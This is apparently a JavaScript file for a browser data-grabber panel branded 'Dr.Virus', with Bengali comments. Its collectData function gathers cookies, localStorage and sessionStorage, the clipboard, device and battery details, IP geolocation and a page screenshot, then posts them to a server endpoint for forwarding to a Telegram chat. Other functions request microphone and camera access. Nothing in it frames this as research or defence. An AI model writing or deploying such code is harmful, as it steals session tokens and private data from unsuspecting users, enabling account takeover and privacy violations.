// ===== স্টেট =====
const state = {
    cookies: [],
    localStorage: [],
    sessionStorage: [],
    logs: [],
    isGrabbing: false,
    autoScroll: true,
    geo: null,
    system: null,
};

// ===== ডম রেফারেন্স =====
const $ = (s, c = document) => c.querySelector(s);
const $$ = (s, c = document) => [...c.querySelectorAll(s)];

const dom = {
    tabs: $$('[data-tab]'),
    contents: {
        dashboard: $('#tab-dashboard'),
        browser: $('#tab-browser'),
        storage: $('#tab-storage'),
        system: $('#tab-system'),
        logs: $('#tab-logs'),
    },
    dash: {
        cookies: $('#dashCookies'),
        local: $('#dashLocal'),
        session: $('#dashSession'),
        logs: $('#dashLogs'),
        progress: $('#progressFill'),
    },
    cookieList: $('#cookieList'),
    localList: $('#localList'),
    sessionList: $('#sessionList'),
    logContainer: $('#logContainer'),
    statusText: $('#statusText'),
    clockDisplay: $('#clockDisplay'),
    statusDot: $('#statusDot'),
    sys: {
        ua: $('#sysUa'),
        platform: $('#sysPlatform'),
        lang: $('#sysLang'),
        screen: $('#sysScreen'),
        tz: $('#sysTz'),
        cores: $('#sysCores'),
        memory: $('#sysMemory'),
        battery: $('#sysBattery'),
    },
    geo: {
        ip: $('#geoIp'),
        country: $('#geoCountry'),
        city: $('#geoCity'),
        isp: $('#geoIsp'),
    },
    telegramToken: $('#telegramToken'),
    telegramChatId: $('#telegramChatId'),
};

// ===== লগিং =====
function addLog(msg, type = 'info') {
    const now = new Date();
    const time = now.toTimeString().slice(0, 8);
    state.logs.push({ time, msg, type });
    dom.dash.logs.textContent = state.logs.length;

    const entry = document.createElement('div');
    entry.className = 'log-entry';
    const icons = { info: 'fa-info-circle', success: 'fa-check-circle', error: 'fa-exclamation-circle', warning: 'fa-exclamation-triangle', token: 'fa-key' };
    const cls = { info: 'info', success: 'success', error: 'error', warning: 'highlight', token: 'info' };
    entry.innerHTML = `<span class="time">${time}</span><span class="msg"><i class="fas ${icons[type]||icons.info} ${cls[type]||cls.info}"></i> ${msg}</span>`;
    dom.logContainer.appendChild(entry);
    if (state.autoScroll) dom.logContainer.scrollTop = dom.logContainer.scrollHeight;
    if (state.logs.length > 500) {
        while (dom.logContainer.children.length > 500) dom.logContainer.firstChild.remove();
    }
}

// ===== ডেটা সংগ্রহ ফাংশন =====
function collectData() {
    const data = {};

    // কুকি
    const cookies = document.cookie.split(';').map(c => {
        const [name, ...rest] = c.trim().split('=');
        return { name, value: rest.join('=') };
    }).filter(c => c.name);
    data.cookies = cookies;
    state.cookies = cookies;
    dom.dash.cookies.textContent = cookies.length;
    document.getElementById('cookieBadge').textContent = cookies.length;

    // লোকাল স্টোরেজ
    const localItems = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localItems.push({ key, value: localStorage.getItem(key) });
    }
    data.localStorage = localItems;
    state.localStorage = localItems;
    dom.dash.local.textContent = localItems.length;

    // সেশন স্টোরেজ
    const sessionItems = [];
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionItems.push({ key, value: sessionStorage.getItem(key) });
    }
    data.sessionStorage = sessionItems;
    state.sessionStorage = sessionItems;
    dom.dash.session.textContent = sessionItems.length;

    // ব্রাউজার ইনফো
    data.browser = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    // সিস্টেম ইনফো
    const sys = {
        cores: navigator.hardwareConcurrency || 'N/A',
        memory: Math.round((navigator.deviceMemory || 4) * 1024),
    };
    // ব্যাটারি
    if (navigator.getBattery) {
        navigator.getBattery().then(b => {
            sys.battery = Math.round(b.level * 100);
            dom.sys.battery.textContent = sys.battery + '%';
            state.system = sys;
            updateSystemUI(sys);
        }).catch(() => {});
    } else {
        sys.battery = 'N/A';
        state.system = sys;
        updateSystemUI(sys);
    }
    data.system = sys;

    // জিওলোকেশন
    if (state.geo) {
        data.geo = state.geo;
    }

    // ক্লিপবোর্ড (যদি অনুমতি থাকে)
    if (navigator.clipboard) {
        navigator.clipboard.readText().then(text => {
            data.clipboard = text;
        }).catch(() => {});
    }

    // স্ক্রিনশট (html2canvas)
    html2canvas(document.body, { useCORS: true, scale: 0.8 }).then(canvas => {
        data.screenshot = canvas.toDataURL('image/jpeg', 0.7);
        sendToTelegram(data);
    }).catch(() => {
        sendToTelegram(data);
    });

    // যদি html2canvas কাজ না করে, তবুও ডেটা পাঠাও
    setTimeout(() => sendToTelegram(data), 3000);
}

// ===== সিস্টেম UI আপডেট =====
function updateSystemUI(sys) {
    dom.sys.ua.textContent = navigator.userAgent.substring(0, 60) + '...';
    dom.sys.platform.textContent = navigator.platform;
    dom.sys.lang.textContent = navigator.language;
    dom.sys.screen.textContent = `${screen.width}x${screen.height}`;
    dom.sys.tz.textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
    dom.sys.cores.textContent = sys.cores;
    dom.sys.memory.textContent = sys.memory ? sys.memory + ' MB' : 'N/A';
    if (sys.battery !== undefined) dom.sys.battery.textContent = sys.battery + '%';
}

// ===== জিওলোকেশন =====
async function fetchGeo() {
    try {
        const res = await fetch('https://ip-api.com/json/');
        const data = await res.json();
        state.geo = {
            ip: data.query || 'N/A',
            country: data.country || 'N/A',
            city: data.city || 'N/A',
            isp: data.isp || 'N/A',
        };
        dom.geo.ip.textContent = state.geo.ip;
        dom.geo.country.textContent = state.geo.country;
        dom.geo.city.textContent = state.geo.city;
        dom.geo.isp.textContent = state.geo.isp;
        addLog(`📍 লোকেশন প্রাপ্ত: ${state.geo.city}, ${state.geo.country}`, 'info');
    } catch {
        dom.geo.ip.textContent = 'N/A';
        addLog('⚠️ জিওলোকেশন লোড করতে ব্যর্থ', 'warning');
    }
}

// ===== টেলিগ্রামে পাঠান =====
async function sendToTelegram(data) {
    const chatId = dom.telegramChatId.value.trim();
    if (!chatId) {
        addLog('⚠️ চ্যাট আইডি দিন', 'warning');
        return;
    }
    dom.statusText.textContent = 'পাঠানো হচ্ছে...';
    dom.statusDot.style.background = 'var(--gold)';

    try {
        const res = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chatId, data }),
        });
        const result = await res.json();
        if (result.success) {
            addLog('✅ টেলিগ্রামে সফলভাবে পাঠানো হয়েছে', 'success');
            dom.statusText.textContent = 'পাঠানো হয়েছে';
            dom.statusDot.style.background = 'var(--green)';
        } else {
            addLog('❌ পাঠাতে ব্যর্থ: ' + (result.error || 'অজানা ত্রুটি'), 'error');
            dom.statusText.textContent = 'ব্যর্থ';
            dom.statusDot.style.background = 'var(--red)';
        }
    } catch (e) {
        addLog('❌ নেটওয়ার্ক ত্রুটি: ' + e.message, 'error');
        dom.statusText.textContent = 'ত্রুটি';
        dom.statusDot.style.background = 'var(--red)';
    }
}

// ===== UI রেন্ডার =====
function renderBrowser() {
    if (state.cookies.length === 0) {
        dom.cookieList.innerHTML = '<div class="text-muted" style="padding:12px 0;">কোনো কুকি নেই</div>';
    } else {
        dom.cookieList.innerHTML = state.cookies.map(c =>
            `<div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13px;">
                <span class="text-gold">${c.name}</span> = <span style="color:var(--text2);">${c.value.substring(0,50)}${c.value.length>50?'...':''}</span>
            </div>`
        ).join('');
    }
}

function renderStorage() {
    // লোকাল
    if (state.localStorage.length === 0) {
        dom.localList.innerHTML = '<div class="text-muted" style="padding:12px 0;">কোনো ডেটা নেই</div>';
    } else {
        dom.localList.innerHTML = state.localStorage.map(item =>
            `<div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13px;">
                <span class="text-gold">${item.key}</span> = <span style="color:var(--text2);">${item.value.substring(0,50)}${item.value.length>50?'...':''}</span>
            </div>`
        ).join('');
    }
    // সেশন
    if (state.sessionStorage.length === 0) {
        dom.sessionList.innerHTML = '<div class="text-muted" style="padding:12px 0;">কোনো ডেটা নেই</div>';
    } else {
        dom.sessionList.innerHTML = state.sessionStorage.map(item =>
            `<div style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13px;">
                <span class="text-gold">${item.key}</span> = <span style="color:var(--text2);">${item.value.substring(0,50)}${item.value.length>50?'...':''}</span>
            </div>`
        ).join('');
    }
}

// ===== পারমিশন ফাংশন =====
async function requestMicrophone() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        addLog('🎤 মাইক্রোফোন অ্যাক্সেস দেওয়া হয়েছে', 'success');
        // অডিও রেকর্ড করতে চাইলে এখানে লজিক যোগ করুন
        stream.getTracks().forEach(t => t.stop());
    } catch {
        addLog('❌ মাইক্রোফোন অ্যাক্সেস denied', 'error');
    }
}

async function requestCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        addLog('📷 ক্যামেরা অ্যাক্সেস দেওয়া হয়েছে', 'success');
        stream.getTracks().forEach(t => t.stop());
    } catch {
        addLog('❌ ক্যামেরা অ্যাক্সেস denied', 'error');
    }
}

async function requestClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        addLog(`📋 ক্লিপবোর্ড: ${text.substring(0,50)}...`, 'info');
    } catch {
        addLog('❌ ক্লিপবোর্ড অ্যাক্সেস denied', 'error');
    }
}

// ===== ড্যাশবোর্ড আপডেট =====
function updateDashboard() {
    dom.dash.cookies.textContent = state.cookies.length;
    dom.dash.local.textContent = state.localStorage.length;
    dom.dash.session.textContent = state.sessionStorage.length;
    dom.dash.logs.textContent = state.logs.length;
    document.getElementById('cookieBadge').textContent = state.cookies.length;
}

// ===== গ্র্যাব শুরু =====
function startGrab() {
    if (state.isGrabbing) return;
    state.isGrabbing = true;
    dom.statusText.textContent = 'গ্র্যাব চলছে...';
    dom.statusDot.style.background = 'var(--gold)';
    addLog('🔄 ডেটা সংগ্রহ শুরু...', 'warning');

    // সংগ্রহ
    collectData();

    // প্রগ্রেস বার অ্যানিমেশন
    let progress = 0;
    const interval = setInterval(() => {
        progress += 5 + Math.random() * 10;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            dom.dash.progress.style.width = '100%';
            state.isGrabbing = false;
            dom.statusText.textContent = 'সম্পন্ন';
            dom.statusDot.style.background = 'var(--green)';
            updateDashboard();
            renderBrowser();
            renderStorage();
            addLog('✅ ডেটা সংগ্রহ সম্পন্ন!', 'success');
        }
        dom.dash.progress.style.width = Math.min(100, progress) + '%';
    }, 500);

    // 5 সেকেন্ড পর ফোর্স কমপ্লিট
    setTimeout(() => {
        if (state.isGrabbing) {
            clearInterval(interval);
            dom.dash.progress.style.width = '100%';
            state.isGrabbing = false;
            dom.statusText.textContent = 'সম্পন্ন';
            dom.statusDot.style.background = 'var(--green)';
            updateDashboard();
            renderBrowser();
            renderStorage();
            addLog('✅ ডেটা সংগ্রহ সম্পন্ন!', 'success');
        }
    }, 8000);
}

// ===== রিসেট =====
function resetAll() {
    if (state.isGrabbing) return;
    state.cookies = [];
    state.localStorage = [];
    state.sessionStorage = [];
    state.logs = [];
    dom.logContainer.innerHTML = '';
    dom.dash.progress.style.width = '0%';
    dom.statusText.textContent = 'প্রস্তুত';
    dom.statusDot.style.background = 'var(--green)';
    updateDashboard();
    renderBrowser();
    renderStorage();
    addLog('🔄 সব রিসেট করা হয়েছে', 'warning');
}

// ===== ক্লক =====
function updateClock() {
    dom.clockDisplay.textContent = new Date().toLocaleTimeString('bn-BD', { hour12: false });
}
setInterval(updateClock, 1000);
updateClock();

// ===== ট্যাব স্যুইচ =====
dom.tabs.forEach(tab => {
    tab.addEventListener('click', (e) => {
        e.preventDefault();
        const target = tab.dataset.tab;
        dom.tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        Object.values(dom.contents).forEach(c => c.classList.remove('active'));
        const el = dom.contents[target];
        if (el) el.classList.add('active');
        if (target === 'logs' && state.autoScroll) {
            setTimeout(() => dom.logContainer.scrollTop = dom.logContainer.scrollHeight, 50);
        }
    });
});

// ===== ইভেন্ট লিসেনার =====
document.getElementById('btnGrab').addEventListener('click', startGrab);
document.getElementById('btnClear').addEventListener('click', resetAll);
document.getElementById('btnStartGrab').addEventListener('click', startGrab);
document.getElementById('btnReset').addEventListener('click', resetAll);
document.getElementById('btnSendTest').addEventListener('click', () => {
    const data = { test: true, message: 'টেস্ট মেসেজ' };
    sendToTelegram(data);
});
document.getElementById('permMicrophone').addEventListener('click', requestMicrophone);
document.getElementById('permCamera').addEventListener('click', requestCamera);
document.getElementById('permClipboard').addEventListener('click', requestClipboard);
document.getElementById('logAutoScroll').addEventListener('click', function() {
    state.autoScroll = !state.autoScroll;
    this.innerHTML = state.autoScroll ? '<i class="fas fa-arrow-down"></i> অটো-স্ক্রল' : '<i class="fas fa-pause"></i> পজ';
    if (state.autoScroll) dom.logContainer.scrollTop = dom.logContainer.scrollHeight;
});
document.getElementById('logClear').addEventListener('click', () => {
    dom.logContainer.innerHTML = '';
    state.logs = [];
    dom.dash.logs.textContent = '0';
    addLog('🧹 লগ ক্লিয়ার', 'warning');
});

// ===== আরম্ভ =====
fetchGeo();
updateDashboard();
renderBrowser();
renderStorage();
addLog('🚀 Dr.Virus প্রস্তুত। "গ্র্যাব" বাটনে ক্লিক করুন।', 'info');
